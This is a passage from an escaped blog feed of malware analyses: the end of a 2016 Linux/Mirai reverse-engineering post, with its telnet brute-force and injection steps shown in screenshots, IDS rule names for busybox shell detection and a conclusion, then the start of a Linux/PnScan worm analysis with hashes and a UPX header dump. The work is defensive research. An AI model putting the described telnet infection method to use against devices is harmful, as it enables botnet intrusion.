of \u003Ci\u003Eskeleton RCE tool\u003C\/i\u003E results (after being \u003Ci\u003Ebeautified\u003C\/i\u003E) by analyzing Linux\/Mirai malware:  \u003Cp\u003EThe cracked functions: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/_QsVmLthlL6NzD0dE3KLCpJCjjJQOKtUIt_omzqnrjTpgE4MZO7mz03cZ7pWny2G19Lc0ELaAVCJKA=w643-h545-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/_QsVmLthlL6NzD0dE3KLCpJCjjJQOKtUIt_omzqnrjTpgE4MZO7mz03cZ7pWny2G19Lc0ELaAVCJKA=w333-h333-no\u003E\u003C\/a\u003E \u003Cp\u003EPutting all together in the main()  :) \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/sFbvBPO5FBoKBTe-YgkNNss-NWm_6CC4RjvQqyS67DRtpK_PVfnMw1-_Jm0dpEgsRXNk7EvhNDdODg=w1186-h880-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/sFbvBPO5FBoKBTe-YgkNNss-NWm_6CC4RjvQqyS67DRtpK_PVfnMw1-_Jm0dpEgsRXNk7EvhNDdODg=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EThe case-switch used for abuse action (attack, etc) trigger, looks like the coding style of Torlus\/GayFgt re-coded version to me.. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/uSQOQ_JcUy9-46al4bZFwU7BUiwqosP-dJgpnzmjyYPTsZpYmQxDP_lJKdhWPd7b8lavnrelOrYj-w=w987-h894-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/uSQOQ_JcUy9-46al4bZFwU7BUiwqosP-dJgpnzmjyYPTsZpYmQxDP_lJKdhWPd7b8lavnrelOrYj-w=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EObviously same style of coding too :-) Some strings are automatic input by skeleton as suggestion since the system found the code matched.  \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/lku57I2mepTA8MI4gDwpBUp-wAaA0tyuM-5TuDKHowYm0MgW3ySYOCZvvcjceUfdZWWeqwj6li9vJA=w824-h904-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/lku57I2mepTA8MI4gDwpBUp-wAaA0tyuM-5TuDKHowYm0MgW3ySYOCZvvcjceUfdZWWeqwj6li9vJA=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EAnother encoded strings blob and path to its decoder addresses:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/eArvOZzZf_Rn2Gt2HJW-azT3ZmS8mra6CF8EMnzjJBJBFH76pEBEJBzpTG3SR0yH3BW0E-VALGDRpQ=w400-h400-no\u003E \u003Cp\u003E\u003Cb\u003ESnips of \"Skeleton\" reversing on the malware's \u003Cb\u003ETelnet Scanning Protocol\u003C\/b\u003E\u003C\/b\u003E \u003Cp\u003E\u003Ci\u003EThis part can not be done well w\/o cool help from WaldoKitty. Not every information will be published, it is posted in enough level to PoC the threat and its origin.\u003C\/i\u003E\u003Cp\u003EThe telnet login command \"grepped\" by the Linux\/Mirai from skeleton C code:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/B8xdB0fwA4z1BDkxTsnGQ9cEB2r3KzxC6PnOlIQLQhk7B5IPO1fS902-Ab84tu55YRKEh8Yturbfdw=w1109-h624-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/B8xdB0fwA4z1BDkxTsnGQ9cEB2r3KzxC6PnOlIQLQhk7B5IPO1fS902-Ab84tu55YRKEh8Yturbfdw=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EThe password request of the telnet login grepped:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/icbb05e4_t0YvCyyQ463ziHXT31363-FgJq2zaVXjsAnSdBhMN0h97wnB9Y6DSyV_EDNV6GKDb7EZQ=w1261-h381-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/icbb05e4_t0YvCyyQ463ziHXT31363-FgJq2zaVXjsAnSdBhMN0h97wnB9Y6DSyV_EDNV6GKDb7EZQ=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EHow the user \u0026 password is sent, one at the time..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/WOR1qSLRUAGRP8yRKnYrrshfvPpay3ZdhsKbjizICVraEeoI89CisWijzr0Tk0wtPXt--9QfH5R6Ng=w1268-h566-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/WOR1qSLRUAGRP8yRKnYrrshfvPpay3ZdhsKbjizICVraEeoI89CisWijzr0Tk0wtPXt--9QfH5R6Ng=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EAttempt to gain the shell...studied from several collected bins\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/fL1OEYU_GsUsrOLWf0Ij8OfGcvx1wvPMnA_rF9XZYq_0cPtsM-4IZHFquxXfu3LrrZayd9TcPyISMA=w964-h245-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/fL1OEYU_GsUsrOLWf0Ij8OfGcvx1wvPMnA_rF9XZYq_0cPtsM-4IZHFquxXfu3LrrZayd9TcPyISMA=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EHow the injected code is formed and sent...in rough code.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/Fg3wd8dZbDzlSQ-k2xUk0WF1MVbQEXNTNHeLW9FOkfE1cuirrwsponw_wU3m15FFSsm6A-qbyt9HRA=w991-h288-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/Fg3wd8dZbDzlSQ-k2xUk0WF1MVbQEXNTNHeLW9FOkfE1cuirrwsponw_wU3m15FFSsm6A-qbyt9HRA=w555-h555-no\u003E\u003C\/a\u003E\u003Cbr\u003EThis will be followed by the fetch malware command described in the \u003Cb\u003Etelnet attack protocol section\u003C\/b\u003E.  \u003Cp\u003EIf you see the above telnet infection generated reversed codes of \u003Cb\u003ELinux\/Mirai\u003C\/b\u003E, except for the usage of encoded strings and some additional\/modification in injected telnet commands, it is reminding us for the previous known malware threat that aimed telnet and IoT\/routers created by the skiddos we posted before. They don't (or maybe just can't) do much modification for the telnet scanner part.  \u003Cp\u003EDespite similarity in the telnet infection, there are some interesting functions can be seen in the malware attack action that's not found in the previous threat, please take a rain check for those, for the current security reason.  \u003Cp\u003EAbout further information on the telnet scannning research from the overall infected IoT device I can recommend you a very good report on telnet honeypot written by \u003Cb\u003E\u003Ci\u003EMr. Bedřich Košata\u003C\/i\u003E\u003C\/b\u003E in \u003Cb\u003ECZ.NIC\u003C\/b\u003E [\u003Ca href=\"http:\/\/blog.nic.cz\/2016\/09\/01\/telnet-stale-zije-alespon-na-chytrych-zarizenich\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/xXktdl5dTkU9h8mLIBkyABr-pm3ABXJ7FRmD2wbtOuLnZOJ0Mp2PXRcN6-VtlRtV-RksI5dFtyJNZA=w853-h399-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/xXktdl5dTkU9h8mLIBkyABr-pm3ABXJ7FRmD2wbtOuLnZOJ0Mp2PXRcN6-VtlRtV-RksI5dFtyJNZA=w555-h399-no\u003E\u003C\/a\u003E \u003Cp\u003E\u003Cb\u003ENotes for skeleton reversed code:\u003C\/b\u003E \u003Cp\u003EThe thing about reverse engineering is, you always can sense same stuff coded from someone or from the threat you follow. The generated code is not 100% same as the original source used, but it is enough to give is idea about how it works in more details and how it was coded. In this reversing I am using the \u003Cstrike\u003Eone \u003C\/strike\u003E several ARM samples in 32bit as main reference, which is influencing the distortion in code generated (to be more using more variables and registers than Intel). I will brush-up these codes in my spare time.  \u003Cp\u003E\u003Ch2\u003EThe conclusion\u003C\/h2\u003E \u003Cp\u003E\u003Cli\u003E\u003Cb\u003EELF Linux\/Mirai\u003C\/b\u003E is the next generation of what they called it as \"GayFgt\/LizKebab\/Torlus\" or what we call it as \"Bash0day, Bashdoor, or Bashlite\" in the past. Which is desigend to be more sophisticated in aiming Linux boxes in internet for the botnet purpose (obviously for the DDoS attack cannons). \u003Cli\u003EThis malware is designed scan the Telnet service running device and to own them, the owned\/infected nodes are used for the cushion for further hacks. By product types, \u003Cb\u003EELF Linux\/Mirai\u003C\/b\u003E is targeting DVR (hint \/dvrHelper), WebIP Camera on busybox, other busybox powered Linux IoT boxes, and unattended Linux servers. \u003Cli\u003EThe only significant addition is the stripping combined with encoded strings, thus added with busybox\/watchdog delay, with other diversion in confusing the traffic filtration. \u003Cli\u003EThe delay in activation of the malware and the CNC different port used is not changing the basic of communication protocol of what previous malware has coded with, the malware is depending by the remote access to operate further. \u003Cli\u003EThe same group of \u003Ci\u003Eskiddo actors\u003C\/i\u003E who use Torlus or GayFgt are the one who responsible for this malware, facts are supporting this assumption with the same attack M.O (via telnet service and telnet scanners), youth hacktivism involved, same trace of coding style, infection style via \u003Cb\u003E\/dev\u003C\/b\u003E with deletion, and so on. It's too obvious. Not necessarily from the same coder but the GayFgt\/Torlus shared code was re-used. \u003Cli\u003ELinux with architecture x86-32 is not their priority, this is why I don't see much of it but focus on samples that are really hitting the devices (mostly are ARM samples), the other is fetched from infection data or by tracking back to its sources.. \u003Cli\u003EThe traffic filtration for this threat is provided thoroughly by IDS\/IPS filtration by ET Labs good folks [\u003Ca href=\"https:\/\/twitter.com\/ET_Labs\"\u003Elink\u003C\/a\u003E], kudos hard working engineers to share the OPEN rules to filter this planet from this threat attacks. If your traffic filtration showed the below indicators, please make sure that you have no open telnet service to be aimed by the attackers. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EOpen rules:\u003Cbr \/\u003E  2023016 - ET TELNET SUSPICIOUS Path to BusyBox\u003Cbr \/\u003E  2023017 - ET TELNET SUSPICIOUS busybox shell\u003Cbr \/\u003E  2023018 - ET TELNET SUSPICIOUS busybox enable\u003Cbr \/\u003E  2023019 - ET TELNET busybox MIRAI hackers - Possible Brute Force Attack\u003C\/pre\u003E\u003Cli\u003EMr. Johnny Vestergaard from HoneyNet Project Norwegian Chapter is releasing report about the recent attempt to hack his honeypots, and Linux\/Mirai attacks were recorded in the same period [\u003Ca href=\"http:\/\/www.honeynet.org\/node\/1328\"\u003Elink\u003C\/a\u003E] \u003Cli\u003EAh, one last thing... We \u003Cb\u003Estill have a better\u003C\/b\u003E KungFu, kiddos! :)\u003Cbr\u003E \u003Cp\u003E\u003Ccenter\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-_X7h2pMQdrU\/VexDK6gC-iI\/AAAAAAAATJQ\/EuSfltvvjrsp8u7E6H7wRtGSx956QN0nACCo\/s600-Ic42\/KillBillJunior1.gif\u003E\u003C\/center\u003E \u003Cp\u003E\u003Ch2\u003EThank you and epilogue\u003C\/h2\u003E \u003Cp\u003ETo all of the good sysadmin friends who uploaded us the samples. To engineer friends in ET Labs for the nice discussion about the threat. To security ring in MMD and my country who support to our ELF research. To the friends who contacted us directly and doing the very best cooperation to share and explain the threat..even-though it was hard to fetch some binaries from the memory but you all did it, we thank you for the hard work and support to make this analysis is possible.   \u003Cp\u003EI will continue the development of the \"skeleton\" tool to be more presentable and used by good people who want to dissect the unknown binary by this method. At the moment I will try to sync \u003Ci\u003Ethe skeleton \u003C\/i\u003Edevelopment plan to be presented in public for the near future. Please contact @unixfreaxjp for the development matters.  \u003Cp\u003EThe moral of the story of this threat ; this is the example, on how a group of bad hackers can improve themselves.. if we let them still be freely doing their vandalism act out there. They keep on improving their threat and they have no care to aim anything that can be infected to expand their \"botnets\". Don't let the young age reducing our priority to stop the actors in the legal way, juveniles scheme in our culture are there for them to taste the consequences of what they do in the real life., let them taste it. If we don't stop them now..think about what they can do for 5 or 10 years from now to our internet.   \u003Cp\u003ETo have Linux boxes in IoT to support our present life aspects is a bless in our technology era. But please be parallel to serve those boxes with more presentable security settings and don't let the authentication security for those running 365\/24\/7 OS becomes obsolete. Apply some securing method to secure it better too in user land UI i.e.: to force users to change the factory setting passwords BEFORE using them, or not to let telnetd runs openly by default, ask the users not to serve SSH in the default ports of possible, and these are really helping to reduce this threat hitting networks that is having much IoT running. Feel free to contact us in @malwaremustdie (twitter\/direct message), or by comments to this post if you have an infection for this malware and look for advisory to dissect it, or to dump the sample from your busybox\/IoT.  \u003Cp\u003E\u003Ch2\u003EThank you very much for the internet media awareness\u003C\/h2\u003E \u003Cp\u003EWe, MMD thank our good friends in internet media for your fast awareness of this threat:\u003Cbr\u003E1. Security Affairs (interview report) [\u003Ca href=\"http:\/\/securityaffairs.co\/wordpress\/50929\/malware\/linux-mirai-elf.html\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E2. Security Week [\u003Ca href=\"http:\/\/www.securityweek.com\/mirai-linux-backdoor-targets-iot-devices\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E3. Softpedia [\u003Ca href=\"http:\/\/news.softpedia.com\/news\/mirai-ddos-trojan-is-the-next-big-threat-for-iot-devices-and-linux-servers-507964.shtml\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E4. Open Source Forum .RU  [\u003Ca href=\"http:\/\/opensourceforu.com\/2016\/09\/mirai-trojan-hit-linux-based-iot-devices\/\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E5. Bug Online .HR [\u003Ca href=\"http:\/\/www.bug.hr\/vijesti\/trojanac-mirai-opasnost-iot-uredaje-linux-pos\/155499.aspx\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E6. Muy Seguridad .ES [\u003Ca href=\"http:\/\/muyseguridad.net\/2016\/09\/06\/mirai-troyano-ddos-iot-linux\/\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E7. IPSInfo. RU  [\u003Ca href=\"https:\/\/ipsinfo.ru\/news\/security\/ddos-troyan-mirai-ugrozhaet-ustroystvam-interneta-veshhey-i-serveram-na-linux-r259\/\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E8. Articulos relacionados con el mundo de la tecnologia .ES [\u003Ca href=\"http:\/\/www.clasesordenador.com\/malware-elf-linux-mirai\/index.html\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E9. 甄选微信朋友圈热门文章_微信热文 .CN [\u003Ca href=\"http:\/\/www.wxrw123.com\/jike\/20160907\/2753199.html\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E10. Info Security Magazine .NL [\u003Ca href=\"http:\/\/infosecuritymagazine.nl\/2016\/09\/07\/nieuwe-malware-maakt-iot-apparaten-onderdeel-van-ddos-botnet\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E11. HelpNet Security [\u003Ca href=\"https:\/\/www.helpnetsecurity.com\/2016\/09\/07\/mirai-linux-trojan-iot-ddos-botnets\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E12. Best Security Search [\u003Ca href=\"http:\/\/bestsecuritysearch.com\/mirai-linux-backdoor-attacks-iot-devices\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E13. 老蔡博客 | 专注云计算运维自动化 .CN [\u003Ca href=\"http:\/\/lcbk.net\/5185.html\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E14. IT Vesti (Bosnian) [\u003Ca href=\"http:\/\/www.itvesti.info\/2016\/09\/trojanac-mirai-preti-iot-ureajima-i.html\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E15. Heise Security .DE [\u003Ca href=\"http:\/\/www.heise.de\/newsticker\/meldung\/Sicherheitsexperten-finden-IoT-Botnet-3317830.html\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E16. Slashdot.org [\u003Ca href=\"https:\/\/it.slashdot.org\/story\/16\/09\/11\/1155202\/iot-devices-with-default-telnet-passwords-used-as-botnet\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E..and others who are not mentioned yet (I am sorry!)  \u003Cp\u003EStay safe folks!   \u003Cp\u003E#MalwareMustDie! \u003Cbr\u003EReversed, analyzed and written by @unixfreaxjp [\u003Ca href=\"https:\/\/twitter.com\/unixfreaxjp\"\u003Elink\u003C\/a\u003E], August 31st 2016."},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/962351771858487603\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/08\/mmd-0056-2016-linuxmirai-just.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/962351771858487603"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/962351771858487603"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/08\/mmd-0056-2016-linuxmirai-just.html","title":"MMD-0056-2016 - Linux\/Mirai, how an old ELF malcode is recycled.. "}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-928146324763269747"},"published":{"$t":"2016-08-23T09:09:00.001-07:00"},"updated":{"$t":"2016-09-07T04:33:08.964-07:00"},"title":{"type":"text","$t":"  MMD-0055-2016 - Linux\/PnScan ; ELF worm that still circles around"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003EJust checked around internet and found an interesting \u003Ci\u003EELF worm\u003C\/i\u003E distribution that may help raising awareness for fellow sysadmins. As per shown in title, it's a known ELF malware threat, could be a latest variant of \"Linux\/PnScan\", found in platform x86-32 that it seems run around the web within infected nodes before it came to my our hand. This worm is more aiming embed platform and I am a bit surprised to find i86 binary is hitting some Linux boxes.  \u003Cp\u003EThis threat came to MalwareMustDie ELF team task before and I posted analysis in Mon Sep 28, 2015 on \u003Ci\u003Ekernelmode\u003C\/i\u003E [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3975\u0026p=26827#p26827\"\u003Elink\u003C\/a\u003E] along with its threat details, I thought the threat is becoming inactive now and it looks like I'm wrong, as the malware works still in infection now as worm functions and is hardcoded to aim 183.83.0.0 \/ 16 segment (located in network area of Telangana and Kashmir region of India), where it was just spotted. Since I never write about this threat in this blog (except in the kernelmode), it will be good to raise awareness to an active working and alive worm by this post.  \u003Cp\u003E\u003Ch2\u003EThreat Indicators\u003C\/h2\u003E \u003Cp\u003EFor some reason we can't inform infection source, but the source is in the targeted network mentioned above. It is hard to seek the patient zero of this infection since the worm seems took a while to circle around the targeted network.  \u003Cp\u003EThe file is having below indicator: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EFilename: 'stdin'(.pnscan.x86-32.mmd)\u003Cbr \/\u003EType: 'ELF 32-bit LSB executable, Intel 80386' (GNU\/Linux) statically linked, stripped\u003Cbr \/\u003EPacker: 'UPX (header bit  tweak) packed,'\u003Cbr \/\u003ESpotted: 'Tue Aug 23 12:27:21 UTC 2016'\u003Cbr \/\u003Emd5:  '6fb6f95546d5bdf4db11655249ee5288'\u003Cbr \/\u003Esha1: '2d3e2ce680de6c13ab3236429efd4bca3bfaa79d'\u003Cbr \/\u003EAccording to VirusTotal it's firstly spotted months ago:\u003Cbr \/\u003E    'First submission 2016-01-27 05:26:45 UTC' \u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EStatic check will find the packed and tweaked UPX was used. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EELF Header:          '↓typical packed one'\u003Cbr \/\u003E  Magic:   7f 45 4c 46 01 01 01 03 00 00 00 00 00 00 00 00\u003Cbr \/\u003E  Class:                             ELF32\u003Cbr \/\u003E  Data:                              2's complement, little endian\u003Cbr \/\u003E  Version:                           1 (current)\u003Cbr \/\u003E  OS\/ABI:                            UNIX - GNU\u003Cbr \/\u003E  ABI Version:                       0\u003Cbr \/\u003E  Type:                              EXEC (Executable file)\u003Cbr \/\u003E  Machine:                           Intel 80386\u003Cbr \/\u003E  Version:                           0x1\u003Cbr \/\u003E 'Entry point address:               0xcfce38'\u003Cbr \/\u003E 'Start of program headers:          52 (bytes into file)'\u003Cbr \/\u003E  Start of section headers:          0 (bytes into file)\u003Cbr \/\u003E  Flags:                             0x0\u003Cbr \/\u003E' Size of this header:               52 (bytes)'\u003Cbr \/\u003E' Size of program headers:           32 (bytes)'\u003Cbr \/\u003E' Number of program headers:         2'\u003Cbr \/\u003E' Size of section headers:           40 (bytes)'\u003Cbr \/\u003E\u003C\/pre\u003E Program Headers: ↓It's a typical UPX header as per explained in different post I made here--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2016\/04\/mmd-0053-2016-bit-about-elfstd-irc-bot.html\"\u003Elink\u003C\/a\u003E] \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E  Type           Offset    VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\u003Cbr \/\u003E  LOAD           0x000000 '0x00c01000' 0x00c01000 0xfc661 0xfc661 R E 0x1000\u003Cbr \/\u003E  LOAD           0x000d68 '0x08290d68' 0x08290d68 0x00000 0x00000 RW  0x1000\u003Cbr \/\u003E\u003C\/pre\u003E\u003Cp\u003EUPX packer traces in the original binary of this worm: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/YekCRyfD4BBBVLnmzZY4UYc4002o2K06ZUbLvtRBP1lnBQHqLe0HDPh_TFXI0zFxYvCwPrSM1FIKmg=w853-h486-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/YekCRyfD4BBBVLnmzZY4UYc4002o2K06ZUbLvtRBP1lnBQHqLe0HDPh_TFXI0zFxYvCwPrSM1FIKmg=w580-h580-no\u003E\u003C\/a\u003E \u003Cp\u003EThis worm is using customized UPX form of header to avoid RE \/ decoding↓ \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E0x00000000  7f45 4c46 0101 0103 0000 0000 0000 0000  .ELF............\u003Cbr \/\u003E0x00000010  0200 0300 0100 0000 38ce cf00 3400 0000  ........8...4...\u003Cbr \/\u003E0x00000020  0000 0000 0000 0000 3400 2000 0200 2800  ........4. ...(.\u003Cbr \/\u003E0x00000030  0000 0000 0100 0000 0000 0000 0010 c000  ................\u003Cbr \/\u003E0x00000040  0010 c000 61c6 0f00 61c6 0f00 0500 0000  ....a...a.......\u003Cbr \/\u003E0x00000050  0010 0000 0100 0000'680d 0000 680d 2908' ........h...h.).\u003Cbr \/\u003E0x00000060  680d 2908 0000 0000 0000 0000 0600 0000  h.).............\u003Cbr \/\u003E0x00000070  0010 0000 22c0 e4b8 5550 5821 3408 0d0c  ....\"...UPX!4...\u003Cbr \/\u003E0x00000080  0000 0000 783f 2400 783f 2400 9400 0000  ....x?$.x?$.....\u003Cbr \/\u003E0x00000090  5d00 0000 0800 0000 771f a4f9 7f45 4c46  ].......w....ELF\u003Cbr \/\u003E0x000000a0  0100 0200 0300 1b68 8104 fbaf bddf 0834  .......h.......4\u003Cbr \/\u003E0x000000b0  0ef8 3c24 2f16 2032 2800 1000 0f00 5b5c  ..\u003C$\/. 2(.....[\\\u003Cbr \/\u003E0x000000c0  e59d 1d80 4607 c807 2200 0527 db76 7fcf  ....F...\"..'.v..\u003Cbr \/\u003E\u003C\/pre\u003EFigure: Modified header  \u003Cp\u003EThere are some ways can be used to put back this ELF to its origin form, I will add howto info in here (public) after this case's handle is done.  \u003Cp\u003EWe have several method to crack some specific made UPX base custom packed ELF, one of them that I used to dissect the ELF of the \"xxx.pokemon(.)inc\" a one IRC DDoS botnet ELF malware I posted in here--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2016\/04\/mmd-0053-2016-bit-about-elfstd-irc-bot.html\"\u003Elink\u003C\/a\u003E]. The other ways to debunk these packed ELF are by different methods of cracking, which are just being shared publicly via radare.org [\u003Ca href=\"http:\/\/radare.org\"\u003Elink\u003C\/a\u003E] community as per below:\u003Cbr\u003E \u003Cimg src=https:\/\/lh3.googleusercontent.com\/duPmCXCzsMk3yZgxwANVTC-1EsDNtlETg6f7B0b1GAaWGJm-QGmsw3r2hItXTYu0L2fr3eFNKRTvNw=w500-h500-no\u003E\u003Cbr\u003EOne of the method(s) described in tutorials above is sufficient enough to crack this ELF successfully. \u003Cp\u003EA protip to sysadmins and RCE beginners (good folks only!) in dealing with difficult ELF packer: Just remember, if you stuck on something, it is only a sign for you to start to improve yourself, just keep on trying. Remember: crooks \u003Cb\u003Enever be smarter\u003C\/b\u003E than you, have  this faith, and in time you'll figure the problem.  \u003Cp\u003E\u003Cb\u003EVideo IR Guideline details of functionality of Linux\/PnScan worm\u003C\/b\u003E \u003Cp\u003EBelow is the detail of the forced unpacked binary of the \u003Cb\u003ELinux\/PnScan worm version\u003C\/b\u003E, This video was actually I made as guide to CERT and IR folks to mitigate the threat. I am using my beloved shell RE tool \"radare\" for this. There are heavy editing, some cuts, and parts skipped w\/also some unexplanatory parts for the sake of on going case security reason. But all indicators are viewable in this video, worth to watch if you are in ISP's IR or CERT field. There are some details are not included in the video too by other security reason.\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"435\" src=\"https:\/\/www.youtube.com\/embed\/58zr-1JU2OI?rel=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E\u003Cbr\u003ENote on video watching: Youtube may sometimes have a weird problem with initial loading video I uploaded recently, if it can not load suddenly in the middle of playing (read: stopped\/stuck), if you experienced this \"phenomenon\" just change the resolution to bigger or smaller arte, and the video will be reloaded and run well... beats me how this problem can happen... but please don't blame the video itself. Thank you.  \u003Cp\u003E\u003Cb\u003EA bit about radare.org's r2\u003C\/b\u003E \u003Cp\u003EFor the static analysis of ELF malware to specially the sysadmins (and reversing enthusiasts), I'd say radare2 (r2) is the best tool I've ever use, following by gdb, objdump and its binutils or ELF utils etc for the purpose. I've been using it for long [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2012\/09\/slight-changes-in-shellcode-dropper.html\"\u003Elink\u003C\/a\u003E] and it never fails me for works I do in UNIX shell. MalwareMustDie team members are officially using it daily for ELF analysis.   \u003Cp\u003EShortly, r2 is not only a tool made by hackers to nail hackers \u0026 its bad coded bins by RCE, but it helps your IR work on static analysis for bad bins in any major \u003Ci\u003ENIX native\u003C\/i\u003E architecture shell environment \u003Cb\u003Einside of infected systems\u003C\/b\u003E. Not only as a static analysis tool, but r2 as forensics tool allows you to extract important IR information instantly and on the fly with its rich command features... it is flexible and fast! The analysis I made and I posted in this blog (and others) are mainly using r2.  \u003Cp\u003EYou can follow radare2 good folks works in here [\u003Ca href=\"https:\/\/github.com\/radare\/radare2\/releases\"\u003Ehere\u003C\/a\u003E] and here [\u003Ca href=\"http:\/\/radare.org\/con\/\"\u003Elink\u003C\/a\u003E].  \u003Cp\u003E\u003Ci\u003ELet's continue with the analysis..  \u003C\/i\u003E\u003Cp\u003EThis ELF is having below dependencies.. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Elibc-2.13.so\u003Cbr \/\u003Eld-2.13.so\u003Cbr \/\u003E\u003C\/pre\u003E..and was compiled on compatibility of \u003Ci\u003EGCC(GNU) 4.1.x\u003C\/i\u003E via the compiler tool \u003Ci\u003EToolchains \u003C\/i\u003E[\u003Ca href=\"http:\/\/elinux.org\/Toolchains\"\u003Elink\u003C\/a\u003E] with cross compiler option for i686 using the SSL enabled configuration. It seems the coder is using working desktop with the crypted disk \u003Cb\u003E\"\/media\/truecrypt1\"\u003C\/b\u003E with workpath \u003Cb\u003E\"\/my\/framework\/\"\u003C\/b\u003E for compiling this :) ouch!  \u003Cp\u003ENo screenshot, no PoC..here we go:\u003Cbr\u003E \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/63PpWoS2rj8zOH3QImTEGZwqMXYY9otDi097L905m_iao_xU6cOSivf_W-NF2x10bNaoaVT9t0NkxQ=w724-h286-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/63PpWoS2rj8zOH3QImTEGZwqMXYY9otDi097L905m_iao_xU6cOSivf_W-NF2x10bNaoaVT9t0NkxQ=w580-h580-no\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EA summary of how it works\u003C\/h2\u003E \u003Cp\u003ETo fellow reversers, there's no specific new function spotted in these sample ELF worms I investigated, except the practical usage is different, that the x86-32 platform are specifically aimed (and this is bad) and a part of India network is now as the target. It is weird a bit on why toolchains is used for i686 compilation, but that also shows x86-32 is not the only targeted aim for this infection too. It is supported the historical data of the infection spotted from September 2015 the versions of mips, mipsel and arm were mostly the main spotted ones. To make it simple in words: This worm is not only targeting Linux with embedded for IoT device and routers, but for servers and appliances too now with, still, aiming its default password login. \u003Cp\u003E\u003Cb\u003EBelow is a summary on how it works:\u003C\/b\u003E \u003Cp\u003E1. It forked 4 times (with its main process = 5)  \u003Cp\u003E2. Created files with the below functionality in the work (executed) directory: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Epermission size date         filename         function\u003Cbr \/\u003E----------------------------------------------------------------\u003Cbr \/\u003E-rw-r--r--  387 Aug 23 12:06 list2            \u003C-- connected hosts\u003Cbr 